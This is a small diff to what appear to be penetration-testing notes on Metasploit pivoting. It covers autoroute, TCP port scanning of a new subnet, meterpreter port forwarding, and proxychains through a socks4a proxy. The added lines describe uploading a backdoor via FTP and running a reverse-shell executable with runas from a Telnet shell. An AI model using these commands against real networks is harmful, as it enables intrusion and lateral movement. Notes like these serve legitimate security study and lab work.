@@ -232,8 +232,12 @@ meterpreter> run auturoute -s TargetSubnet/24
 msf> route print // check if all traffic destined to that subnet goes through selected session host
 msf> use auxiliary/scanner/portscan/tcp // try to scan tcp ports in new subnet
 //To direct web server traffic to our local port, use port forwarding from foothold machine
-meterpreter> protfwd addd -l 8001 -p 80 -r TargetMachine
+meterpreter> portfwd add -l 8001 -p 80 -r TargetMachine
 
+//Can also upload backdoor via FTP client to Server and then execute from Telnet shell on Server.
+//Telnet C:\inetpub\ftproot> runas /user:netadmin msf_reverse.exe
+
+Another Way to Setup Pivots with Proxychains/Socks4
 > use auxiliary/server/socks4a && run // start a socks4a proxy server
 // edit proxychains conf file, sudo nano /etc/proxychains.conf ; only need to set last line as socks4 127.0.0.1 1080
 // Once proxychains set, all commands ran should be pivoted through server with prepending proxychains command
